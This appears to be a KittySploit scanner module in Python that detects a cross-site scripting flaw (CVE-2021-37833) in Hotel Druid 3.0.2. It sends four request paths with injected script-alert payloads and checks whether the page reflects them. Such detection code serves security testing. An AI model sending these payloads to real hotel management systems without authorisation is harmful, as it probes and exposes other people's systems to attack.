#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hotel Druid 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hotel Druid 3.0.2 - Cross-Site Scripting Detection',
        'description': 'Hotel Druid 3.0.2 contains a cross-site scripting vulnerability in multiple pages which allows for arbitrary execution of JavaScript commands.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'hoteldruid', 'xss', 'digitaldruid', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/dievus/CVE-2021-37833',
            'https://www.hoteldruid.com',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-37833',
        ],
        'cve': 'CVE-2021-37833',
    }

    def run(self):
        for path in ('/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ew5px3=1', '/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1', '/tabella.php?jkuh3%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Eyql8b=1', '/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&form_availability_calendar_template=1'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = (r.text or "").lower()
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            body_any = ('</script><script>alert(document.domain)</script>', 'hoteldruid',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Hotel Druid 3.0.2 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

